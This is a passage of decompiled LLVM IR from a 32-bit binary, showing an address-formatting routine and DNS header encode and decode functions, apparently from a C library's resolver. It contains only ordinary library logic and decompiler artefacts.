  br i1 %v5_8053b76, label %dec_label_pc_8053b78, label %dec_label_pc_8053b82

dec_label_pc_8053b78:                             ; preds = %dec_label_pc_8053b71
  %v1_8053b7a = icmp eq i1 %v12_8053b6d, false
  br i1 %v1_8053b7a, label %dec_label_pc_8053bf3, label %dec_label_pc_8053b7c

dec_label_pc_8053b7c:                             ; preds = %dec_label_pc_8053b78
  %v1_8053b7c = inttoptr i32 %v0_8053b8664 to i8*
  store i8 58, i8* %v1_8053b7c, align 1
  %v0_8053b7f = load i32, i32* @ebx, align 4
  %v1_8053b7f = add i32 %v0_8053b7f, 1
  store i32 %v1_8053b7f, i32* @ebx, align 4
  br label %dec_label_pc_8053bf3

dec_label_pc_8053b82:                             ; preds = %dec_label_pc_8053b71, %dec_label_pc_8053b6d, %dec_label_pc_8053b68
  %v1_8053b82 = icmp eq i32 %v0_8053b8266, 0
  br i1 %v1_8053b82, label %dec_label_pc_8053b8a.thread, label %dec_label_pc_8053b8a

dec_label_pc_8053b8a.thread:                      ; preds = %dec_label_pc_8053b82
  br label %dec_label_pc_8053bde

dec_label_pc_8053b8a:                             ; preds = %dec_label_pc_8053b82
  %v1_8053b86 = inttoptr i32 %v0_8053b8664 to i8*
  store i8 58, i8* %v1_8053b86, align 1
  %v0_8053b89 = load i32, i32* @ebx, align 4
  %v1_8053b89 = add i32 %v0_8053b89, 1
  store i32 %v1_8053b89, i32* @ebx, align 4
  %v0_8053b8a.pre = load i32, i32* @esi, align 4
  %v9_8053b8a = icmp eq i32 %v0_8053b8a.pre, 6
  %v1_8053b8d = icmp eq i1 %v9_8053b8a, false
  br i1 %v1_8053b8d, label %dec_label_pc_8053bde, label %dec_label_pc_8053b8f

dec_label_pc_8053b8f:                             ; preds = %dec_label_pc_8053b8a
  %v0_8053b8f = load i32, i32* @edi, align 4
  %v1_8053b8f = icmp eq i32 %v0_8053b8f, 0
  %v1_8053b91 = icmp eq i1 %v1_8053b8f, false
  br i1 %v1_8053b91, label %dec_label_pc_8053bde, label %dec_label_pc_8053b93

dec_label_pc_8053b93:                             ; preds = %dec_label_pc_8053b8f
  %v0_8053b93 = load i32, i32* @ebp, align 4
  %v9_8053b93 = icmp eq i32 %v0_8053b93, 6
  br i1 %v9_8053b93, label %dec_label_pc_8053ba7, label %dec_label_pc_8053b98

dec_label_pc_8053b98:                             ; preds = %dec_label_pc_8053b93
  %v9_8053b98 = icmp eq i32 %v0_8053b93, 5
  %v1_8053b9b = icmp eq i1 %v9_8053b98, false
  br i1 %v1_8053b9b, label %dec_label_pc_8053bde, label %dec_label_pc_8053b9d

dec_label_pc_8053b9d:                             ; preds = %dec_label_pc_8053b98
  br i1 %v1_8053ba5, label %dec_label_pc_8053bde, label %dec_label_pc_8053ba7

dec_label_pc_8053ba7:                             ; preds = %dec_label_pc_8053b9d, %dec_label_pc_8053b93
  %v2_8053bad = sub i32 %v1_8053b89, %v2_8053b5d
  store i32 %v2_8053bad, i32* @esi, align 4
  %v2_8053bb8 = sub i32 46, %v2_8053bad
  store i32 %v2_8053bb8, i32* @ecx, align 4
  %v1_8053bba = add i32 %arg2, 12
  store i32 %v1_8053bba, i32* @eax, align 4
  store i32 %v1_8053b89, i32* @edx, align 4
  %v0_8053bbf = load i8*, i8** %stack_var_-124, align 4
  %v1_8053bbf = ptrtoint i8* %v0_8053bbf to i32
  %v3_8053bbf = ptrtoint i8* %stack_var_-120.163 to i32
  %v5_8053bbf = call i32 @inet_ntop4(i32 %v1_8053bbf, i32 %v3_8053bbf, i32 %stack_var_-116.162)
  store i32 %v5_8053bbf, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8053bc6 = icmp eq i32 %v5_8053bbf, 0
  br i1 %v1_8053bc6, label %dec_label_pc_8053c50, label %dec_label_pc_8053bce

dec_label_pc_8053bce:                             ; preds = %dec_label_pc_8053ba7
  %v0_8053bd1 = load i32, i32* @ebx, align 4
  %v5_8053bd1 = inttoptr i32 %v0_8053bd1 to i8*
  store i8* %v5_8053bd1, i8** %stack_var_-124, align 4
  %v3_8053bd2 = call i32 @strlen(i8* %v5_8053bd1)
  store i32 %v3_8053bd2, i32* %eax.global-to-local, align 4
  %v0_8053bda = load i32, i32* @ebx, align 4
  %v3_8053bda = add i32 %v0_8053bda, %v3_8053bd2
  store i32 %v3_8053bda, i32* @ebx, align 4
  %v0_8053c02.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053c02

dec_label_pc_8053bde:                             ; preds = %dec_label_pc_8053b8a.thread, %dec_label_pc_8053b9d, %dec_label_pc_8053b98, %dec_label_pc_8053b8f, %dec_label_pc_8053b8a
  %v1_8053bdf54 = phi i32 [ 0, %dec_label_pc_8053b8a.thread ], [ %v0_8053b8a.pre, %dec_label_pc_8053b9d ], [ %v0_8053b8a.pre, %dec_label_pc_8053b98 ], [ %v0_8053b8a.pre, %dec_label_pc_8053b8f ], [ %v0_8053b8a.pre, %dec_label_pc_8053b8a ]
  %v0_8053be853 = phi i32 [ %v0_8053b8664, %dec_label_pc_8053b8a.thread ], [ %v1_8053b89, %dec_label_pc_8053b9d ], [ %v1_8053b89, %dec_label_pc_8053b98 ], [ %v1_8053b89, %dec_label_pc_8053b8f ], [ %v1_8053b89, %dec_label_pc_8053b8a ]
  %v0_8053bde = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8053bde, i32* %stack_var_-112, align 4
  %v2_8053bdf = mul i32 %v1_8053bdf54, 4
  %v4_8053bdf = add i32 %v3_8053bdf, %v2_8053bdf
  %v5_8053bdf = inttoptr i32 %v4_8053bdf to i32*
  %v6_8053bdf = load i32, i32* %v5_8053bdf, align 4
  %v5_8053be8 = inttoptr i32 %v0_8053be853 to i8*
  store i8* %v5_8053be8, i8** %stack_var_-124, align 4
  %v6_8053be9 = call i32 @sprintf(i32 %v0_8053be853, i32 ptrtoint ([3 x i8]* @global_var_80580f1.294 to i32), i32 %v6_8053bdf, i32 %v0_8053bde)
  store i32 %v6_8053be9, i32* %eax.global-to-local, align 4
  %v0_8053bf1 = load i32, i32* @ebx, align 4
  %v2_8053bf1 = add i32 %v0_8053bf1, %v6_8053be9
  store i32 %v2_8053bf1, i32* @ebx, align 4
  br label %dec_label_pc_8053bf3

dec_label_pc_8053bf3:                             ; preds = %dec_label_pc_8053b78, %dec_label_pc_8053b7c, %dec_label_pc_8053bde
  %stack_var_-116.0 = phi i32 [ %v6_8053bdf, %dec_label_pc_8053bde ], [ %stack_var_-116.162, %dec_label_pc_8053b78 ], [ %stack_var_-116.162, %dec_label_pc_8053b7c ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80580f1.294, i32 0, i32 0), %dec_label_pc_8053bde ], [ %stack_var_-120.163, %dec_label_pc_8053b78 ], [ %stack_var_-120.163, %dec_label_pc_8053b7c ]
  %v0_8053b7c19 = phi i32 [ %v2_8053bf1, %dec_label_pc_8053bde ], [ %v0_8053b8664, %dec_label_pc_8053b78 ], [ %v1_8053b7f, %dec_label_pc_8053b7c ]
  %v0_8053bf3 = load i32, i32* @esi, align 4
  %v1_8053bf3 = add i32 %v0_8053bf3, 1
  %v0_8053bfd.pre = load i32, i32* @edi, align 4
  store i32 %v1_8053bf3, i32* @esi, align 4
  %v7_8053bf7 = icmp sgt i32 %v1_8053bf3, 7
  %v10_8053bfd = icmp eq i32 %v0_8053bfd.pre, -1
  br i1 %v7_8053bf7, label %dec_label_pc_8053bfd, label %dec_label_pc_8053b68

dec_label_pc_8053bfd:                             ; preds = %dec_label_pc_8053bf3
  br i1 %v10_8053bfd, label %dec_label_pc_8053c0e, label %dec_label_pc_8053c02

dec_label_pc_8053c02:                             ; preds = %dec_label_pc_8053bfd, %dec_label_pc_8053bce
  %v0_8053c0a = phi i32 [ %v0_8053b7c19, %dec_label_pc_8053bfd ], [ %v3_8053bda, %dec_label_pc_8053bce ]
  %v0_8053c02 = phi i32 [ %v0_8053bfd.pre, %dec_label_pc_8053bfd ], [ %v0_8053c02.pre, %dec_label_pc_8053bce ]
  %v1_8053c02 = load i32, i32* @ebp, align 4
  %v2_8053c02 = add i32 %v1_8053c02, %v0_8053c02
  store i32 %v2_8053c02, i32* %eax.global-to-local, align 4
  %v9_8053c05 = icmp eq i32 %v2_8053c02, 8
  %v1_8053c08 = icmp eq i1 %v9_8053c05, false
  br i1 %v1_8053c08, label %dec_label_pc_8053c0e, label %dec_label_pc_8053c0a

dec_label_pc_8053c0a:                             ; preds = %dec_label_pc_8053c02
  %v1_8053c0a = inttoptr i32 %v0_8053c0a to i8*
  store i8 58, i8* %v1_8053c0a, align 1
  %v0_8053c0d = load i32, i32* @ebx, align 4
  %v1_8053c0d = add i32 %v0_8053c0d, 1
  store i32 %v1_8053c0d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053c0e

dec_label_pc_8053c0e:                             ; preds = %dec_label_pc_8053c02, %dec_label_pc_8053bfd, %dec_label_pc_8053c0a
  %v0_8053c12 = phi i32 [ %v0_8053c0a, %dec_label_pc_8053c02 ], [ %v0_8053b7c19, %dec_label_pc_8053bfd ], [ %v1_8053c0d, %dec_label_pc_8053c0a ]
  store i32 %v2_8053b5d, i32* %edx.global-to-local, align 4
  %v1_8053c12 = add i32 %v0_8053c12, 1
  store i32 %v1_8053c12, i32* %eax.global-to-local, align 4
  %v1_8053c15 = inttoptr i32 %v0_8053c12 to i8*
  store i8 0, i8* %v1_8053c15, align 1
  %v0_8053c18 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053c18 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053c18 = sub i32 %v0_8053c18, %v1_8053c18
  store i32 %v2_8053c18, i32* @eax, align 4
  %tmp78 = icmp ugt i32 %v2_8053c18, %arg4
  br i1 %tmp78, label %dec_label_pc_8053c20, label %dec_label_pc_8053c2d

dec_label_pc_8053c20:                             ; preds = %dec_label_pc_8053c0e
  %v0_8053c20 = load i8*, i8** %stack_var_-124, align 4
  %v1_8053c20 = ptrtoint i8* %v0_8053c20 to i32
  %v2_8053c20 = call i32 @__errno_location(i32 %v1_8053c20)
  store i32 %v2_8053c20, i32* %eax.global-to-local, align 4
  %v1_8053c25 = inttoptr i32 %v2_8053c20 to i32*
  store i32 28, i32* %v1_8053c25, align 4
  br label %dec_label_pc_8053c4e

dec_label_pc_8053c2d:                             ; preds = %dec_label_pc_8053c0e
  %v0_8053c2d = load i32, i32* @edi, align 4
  store i32 %v0_8053c2d, i32* %stack_var_-112, align 4
  %tmp45 = bitcast i8** %stack_var_12 to i32*
  %v3_8053c302 = load i32, i32* %tmp45, align 4
  %tmp46 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_8053c302, i32* %tmp46, align 4
  %v0_8053c37.cast = inttoptr i32 %v3_8053c302 to i8*
  %v5_8053c37 = call i32 @strcpy(i8* %v0_8053c37.cast, i32 %v2_8053b5d)
  store i32 %v5_8053c37, i32* %eax.global-to-local, align 4
  store i32 %v5_8053c37, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053c50

dec_label_pc_8053c43:                             ; preds = %dec_label_pc_8053a9c
  %v1_8053c43 = call i32 @__errno_location(i32 %v0_8053a8f)
  store i32 %v1_8053c43, i32* %eax.global-to-local, align 4
  %v1_8053c48 = inttoptr i32 %v1_8053c43 to i32*
  store i32 97, i32* %v1_8053c48, align 4
  br label %dec_label_pc_8053c4e

dec_label_pc_8053c4e:                             ; preds = %dec_label_pc_8053c20, %dec_label_pc_8053c43
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053c50

dec_label_pc_8053c50:                             ; preds = %dec_label_pc_8053ba7, %dec_label_pc_8053c2d, %dec_label_pc_8053aa7, %dec_label_pc_8053c4e
  %v0_8053c53 = phi i32 [ 0, %dec_label_pc_8053ba7 ], [ %v5_8053c37, %dec_label_pc_8053c2d ], [ %v3_8053ab3, %dec_label_pc_8053aa7 ], [ 0, %dec_label_pc_8053c4e ]
  store i32 %v0_8053c53, i32* %eax.global-to-local, align 4
  store i32 %v0_8053a8f, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8053c53

; uselistorder directives
  uselistorder i32 %v0_8053c53, { 1, 0 }
  uselistorder i32 %v0_8053c12, { 1, 0 }
  uselistorder i32 %v1_8053bf3, { 1, 0, 2 }
  uselistorder i32 %v0_8053be853, { 1, 0 }
  uselistorder i32 %v0_8053b8a.pre, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8053b89, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %stack_var_-116.162, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.163, { 2, 1, 0 }
  uselistorder i32 %v0_8053b8664, { 2, 3, 1, 0 }
  uselistorder i32 %v1_8053b7865, { 2, 0, 1 }
  uselistorder i32 %v0_8053b8266, { 2, 1, 0, 3 }
  uselistorder i32 %v2_8053b5d, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_8053b55, { 1, 0 }
  uselistorder i32 %v0_8053b55, { 1, 2, 0 }
  uselistorder i32 %v1_8053b38, { 0, 2, 1 }
  uselistorder i32 %v0_8053b289, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8053b3313, { 0, 2, 1, 3 }
  uselistorder i1 %v10_8053b23, { 1, 0 }
  uselistorder i32 %v0_8053b4e68, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8053b4369, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8053b3871, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_8053af372, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8053a8f, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 6, 5, 2, 4, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 13, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 97, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @sprintf, { 2, 1, 0 }
  uselistorder [3 x i8]* @global_var_80580f1.294, { 1, 0 }
  uselistorder i8 58, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 65535, { 1, 0, 3, 4, 2 }
  uselistorder i32 64, { 6, 2, 0, 5, 7, 4, 1, 3 }
  uselistorder i32* @esp, { 0, 1, 72, 73, 74, 75, 76, 77, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 14, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 10, 258, 259, 260, 11, 261, 8, 262, 263, 264, 265, 266, 267, 12, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 9, 281, 282, 283, 284, 285, 286, 13, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 197, 2, 3, 315, 4, 5, 6, 15, 198, 199, 200, 201, 16, 202, 203, 204, 205, 206, 18, 207, 208, 209, 20, 210, 21, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 19, 223, 22, 224, 225, 226, 23, 227, 228, 229, 230, 231, 232, 233, 234, 17, 235, 108, 24, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 91, 7, 88, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 109, 110, 111, 112, 113, 114, 115, 116, 117, 121, 118, 119, 120, 122, 123, 125, 124, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 25, 141, 142, 143, 144, 145, 146, 26, 147, 148, 149, 150, 27, 151, 152, 153, 154, 155, 156, 157, 28, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 29, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 30, 66, 67, 68, 69, 70, 71, 236, 308, 309, 310, 311, 312, 313, 314 }
  uselistorder i32 15, { 0, 3, 9, 8, 1, 7, 2, 4, 5, 6 }
  uselistorder i32 60, { 4, 5, 2, 6, 7, 3, 0, 1 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 7, 9, 10, 4, 15, 16, 13, 14, 5, 1, 2, 3, 8, 6, 11, 12 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8053c50, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8053c4e, { 1, 0 }
  uselistorder label %dec_label_pc_8053c0e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053bf3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053bde, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8053b68, { 1, 0 }
  uselistorder label %dec_label_pc_8053b5d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053b50, { 1, 0 }
  uselistorder label %dec_label_pc_8053b4c, { 1, 0 }
  uselistorder label %dec_label_pc_8053b38, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8053b35, { 1, 0 }
  uselistorder label %dec_label_pc_8053b0b, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i8* @__decompiler_undefined_function_2()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8053c5d = load i32, i32* @ebx, align 4
  store i32 %v0_8053c5d, i32* %stack_var_-8, align 4
  store i32 %tmp9, i32* %ebx.global-to-local, align 4
  %v4_8053c65 = ptrtoint i8* %tmp8 to i32
  store i32 %v4_8053c65, i32* %esi.global-to-local, align 4
  %v7_8053c6e = icmp sgt i32 %tmp, 11
  br i1 %v7_8053c6e, label %dec_label_pc_8053c74, label %dec_label_pc_8053d0a

dec_label_pc_8053c74:                             ; preds = %entry
  %v1_8053c74 = add i32 %tmp9, 1
  %v2_8053c74 = inttoptr i32 %v1_8053c74 to i8*
  %v3_8053c74 = load i8, i8* %v2_8053c74, align 1
  store i8 %v3_8053c74, i8* %tmp8, align 1
  %v0_8053c7a = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053c7a = inttoptr i32 %v0_8053c7a to i32*
  %v2_8053c7a = load i32, i32* %v1_8053c7a, align 4
  %v1_8053c7c = trunc i32 %v2_8053c7a to i8
  %v2_8053c7c = load i32, i32* %esi.global-to-local, align 4
  %v3_8053c7c = add i32 %v2_8053c7c, 1
  %v4_8053c7c = inttoptr i32 %v3_8053c7c to i8*
  store i8 %v1_8053c7c, i8* %v4_8053c7c, align 1
  %v0_8053ca2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053ca2 = add i32 %v0_8053ca2, 8
  %v2_8053ca2 = inttoptr i32 %v1_8053ca2 to i32*
  %v3_8053ca2 = load i32, i32* %v2_8053ca2, align 4
  %v1_8053ca5 = mul i32 %v3_8053ca2, 8
  %v2_8053cab = or i32 %v1_8053ca5, 4
  %v1_8053cad = add i32 %v0_8053ca2, 20
  %v2_8053cad = inttoptr i32 %v1_8053cad to i32*
  %v3_8053cad = load i32, i32* %v2_8053cad, align 4
  %v4_8053cad = icmp eq i32 %v3_8053cad, 0
  %v1_8053cb1 = icmp eq i1 %v4_8053cad, false
  %v2_8053cb1 = zext i1 %v1_8053cb1 to i32
  %v2_8053cb4 = or i32 %v2_8053cb1, %v2_8053cab
  %v2_8053cb6 = or i32 %v2_8053cb4, -126
  %v5_8053cb6 = trunc i32 %v2_8053cb6 to i8
  store i32 %v2_8053cb6, i32* @ecx, align 4
  %v2_8053cb8 = load i32, i32* %esi.global-to-local, align 4
  %v3_8053cb8 = add i32 %v2_8053cb8, 2
  %v4_8053cb8 = inttoptr i32 %v3_8053cb8 to i8*
  store i8 %v5_8053cb6, i8* %v4_8053cb8, align 1
  %v0_8053cbb = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053cc1 = add i32 %v0_8053cbb, 28
  %v2_8053cc1 = inttoptr i32 %v1_8053cc1 to i8*
  %v3_8053cc1 = load i8, i8* %v2_8053cc1, align 1
  %tmp13 = urem i8 %v3_8053cc1, 16
  %v2_8053ccc = or i8 %tmp13, -128
  %v2_8053cce = load i32, i32* %esi.global-to-local, align 4
  %v3_8053cce = add i32 %v2_8053cce, 3
  %v4_8053cce = inttoptr i32 %v3_8053cce to i8*
  store i8 %v2_8053ccc, i8* %v4_8053cce, align 1
  %v0_8053cd1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053cd1 = add i32 %v0_8053cd1, 33
  %v2_8053cd1 = inttoptr i32 %v1_8053cd1 to i8*
  %v3_8053cd1 = load i8, i8* %v2_8053cd1, align 1
  %v2_8053cd5 = load i32, i32* %esi.global-to-local, align 4
  %v3_8053cd5 = add i32 %v2_8053cd5, 4
  %v4_8053cd5 = inttoptr i32 %v3_8053cd5 to i8*
  store i8 %v3_8053cd1, i8* %v4_8053cd5, align 1
  %v0_8053cd8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053cd8 = add i32 %v0_8053cd8, 32
  %v2_8053cd8 = inttoptr i32 %v1_8053cd8 to i32*
  %v3_8053cd8 = load i32, i32* %v2_8053cd8, align 4
  %v1_8053cdb = trunc i32 %v3_8053cd8 to i8
  %v2_8053cdb = load i32, i32* %esi.global-to-local, align 4
  %v3_8053cdb = add i32 %v2_8053cdb, 5
  %v4_8053cdb = inttoptr i32 %v3_8053cdb to i8*
  store i8 %v1_8053cdb, i8* %v4_8053cdb, align 1
  %v0_8053cde = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053cde = add i32 %v0_8053cde, 37
  %v2_8053cde = inttoptr i32 %v1_8053cde to i8*
  %v3_8053cde = load i8, i8* %v2_8053cde, align 1
  %v2_8053ce2 = load i32, i32* %esi.global-to-local, align 4
  %v3_8053ce2 = add i32 %v2_8053ce2, 6
  %v4_8053ce2 = inttoptr i32 %v3_8053ce2 to i8*
  store i8 %v3_8053cde, i8* %v4_8053ce2, align 1
  %v0_8053ce5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053ce5 = add i32 %v0_8053ce5, 36
  %v2_8053ce5 = inttoptr i32 %v1_8053ce5 to i32*
  %v3_8053ce5 = load i32, i32* %v2_8053ce5, align 4
  %v1_8053ce8 = trunc i32 %v3_8053ce5 to i8
  %v2_8053ce8 = load i32, i32* %esi.global-to-local, align 4
  %v3_8053ce8 = add i32 %v2_8053ce8, 7
  %v4_8053ce8 = inttoptr i32 %v3_8053ce8 to i8*
  store i8 %v1_8053ce8, i8* %v4_8053ce8, align 1
  %v0_8053ceb = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053ceb = add i32 %v0_8053ceb, 41
  %v2_8053ceb = inttoptr i32 %v1_8053ceb to i8*
  %v3_8053ceb = load i8, i8* %v2_8053ceb, align 1
  %v2_8053cef = load i32, i32* %esi.global-to-local, align 4
  %v3_8053cef = add i32 %v2_8053cef, 8
  %v4_8053cef = inttoptr i32 %v3_8053cef to i8*
  store i8 %v3_8053ceb, i8* %v4_8053cef, align 1
  %v0_8053cf2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053cf2 = add i32 %v0_8053cf2, 40
  %v2_8053cf2 = inttoptr i32 %v1_8053cf2 to i32*
  %v3_8053cf2 = load i32, i32* %v2_8053cf2, align 4
  %v1_8053cf5 = trunc i32 %v3_8053cf2 to i8
  %v2_8053cf5 = load i32, i32* %esi.global-to-local, align 4
  %v3_8053cf5 = add i32 %v2_8053cf5, 9
  %v4_8053cf5 = inttoptr i32 %v3_8053cf5 to i8*
  store i8 %v1_8053cf5, i8* %v4_8053cf5, align 1
  %v0_8053cf8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053cf8 = add i32 %v0_8053cf8, 45
  %v2_8053cf8 = inttoptr i32 %v1_8053cf8 to i8*
  %v3_8053cf8 = load i8, i8* %v2_8053cf8, align 1
  %v2_8053cfc = load i32, i32* %esi.global-to-local, align 4
  %v3_8053cfc = add i32 %v2_8053cfc, 10
  %v4_8053cfc = inttoptr i32 %v3_8053cfc to i8*
  store i8 %v3_8053cf8, i8* %v4_8053cfc, align 1
  %v0_8053cff = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053cff = add i32 %v0_8053cff, 44
  %v2_8053cff = inttoptr i32 %v1_8053cff to i32*
  %v3_8053cff = load i32, i32* %v2_8053cff, align 4
  %v1_8053d02 = trunc i32 %v3_8053cff to i8
  %v2_8053d02 = load i32, i32* %esi.global-to-local, align 4
  %v3_8053d02 = add i32 %v2_8053d02, 11
  %v4_8053d02 = inttoptr i32 %v3_8053d02 to i8*
  store i8 %v1_8053d02, i8* %v4_8053d02, align 1
  %v2_8053d0a.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8053d0a

dec_label_pc_8053d0a:                             ; preds = %entry, %dec_label_pc_8053c74
  %v2_8053d0a = phi i32 [ %v0_8053c5d, %entry ], [ %v2_8053d0a.pre, %dec_label_pc_8053c74 ]
  %v0_8053d0c = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_8053c74 ]
  store i32 %v2_8053d0a, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8053d0c

; uselistorder directives
  uselistorder i32 45, { 5, 1, 4, 3, 0, 2 }
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 3, 1, 0, 2 }
  uselistorder i32 33, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8053d0a, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_8053d10 = load i32, i32* @ebx, align 4
  store i32 %v0_8053d10, i32* %stack_var_-4, align 4
  %v4_8053d11 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_8053d11, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_8053d19 = load i8, i8* %tmp2, align 1
  %v3_8053d19 = zext i8 %v2_8053d19 to i32
  %v1_8053d1c = add i32 %v4_8053d11, 1
  %v2_8053d1c = inttoptr i32 %v1_8053d1c to i8*
  %v3_8053d1c = load i8, i8* %v2_8053d1c, align 1
  %v4_8053d1c = zext i8 %v3_8053d1c to i32
  %v2_8053d20 = mul nuw nsw i32 %v3_8053d19, 256
  %v2_8053d23 = or i32 %v4_8053d1c, %v2_8053d20
  %v2_8053d25 = inttoptr i32 %tmp to i32*
  store i32 %v2_8053d23, i32* %v2_8053d25, align 4
  %v0_8053d27 = load i32, i32* @ecx, align 4
  %v1_8053d27 = add i32 %v0_8053d27, 2
  %v2_8053d27 = inttoptr i32 %v1_8053d27 to i8*
  %v3_8053d27 = load i8, i8* %v2_8053d27, align 1
  %tmp6 = icmp slt i8 %v3_8053d27, 0
  %v2_8053d2b = zext i1 %tmp6 to i32
  %v1_8053d2e = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053d2e = add i32 %v1_8053d2e, 4
  %v3_8053d2e = inttoptr i32 %v2_8053d2e to i32*
  store i32 %v2_8053d2b, i32* %v3_8053d2e, align 4
  %v0_8053d31 = load i32, i32* @ecx, align 4
  %v1_8053d31 = add i32 %v0_8053d31, 2
  %v2_8053d31 = inttoptr i32 %v1_8053d31 to i8*
  %v3_8053d31 = load i8, i8* %v2_8053d31, align 1
  %v3_8053d34 = udiv i8 %v3_8053d31, 8
  %tmp7 = urem i8 %v3_8053d34, 16
  %v1_8053d37 = zext i8 %tmp7 to i32
  %v1_8053d3a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053d3a = add i32 %v1_8053d3a, 8
  %v3_8053d3a = inttoptr i32 %v2_8053d3a to i32*
  store i32 %v1_8053d37, i32* %v3_8053d3a, align 4
  %v0_8053d3d = load i32, i32* @ecx, align 4
  %v1_8053d3d = add i32 %v0_8053d3d, 2
  %v2_8053d3d = inttoptr i32 %v1_8053d3d to i8*
  %v3_8053d3d = load i8, i8* %v2_8053d3d, align 1
  %div = udiv i8 %v3_8053d3d, 4
  %tmp8 = urem i8 %div, 2
  %v1_8053d44 = zext i8 %tmp8 to i32
  %v1_8053d47 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053d47 = add i32 %v1_8053d47, 12
  %v3_8053d47 = inttoptr i32 %v2_8053d47 to i32*
  store i32 %v1_8053d44, i32* %v3_8053d47, align 4
  %v0_8053d4a = load i32, i32* @ecx, align 4
  %v1_8053d4a = add i32 %v0_8053d4a, 2
  %v2_8053d4a = inttoptr i32 %v1_8053d4a to i8*
  %v3_8053d4a = load i8, i8* %v2_8053d4a, align 1
  %div5 = udiv i8 %v3_8053d4a, 2
  %tmp9 = urem i8 %div5, 2
  %v1_8053d50 = zext i8 %tmp9 to i32
  %v1_8053d53 = load i32, i32* %ebx.global-to-local, align 4
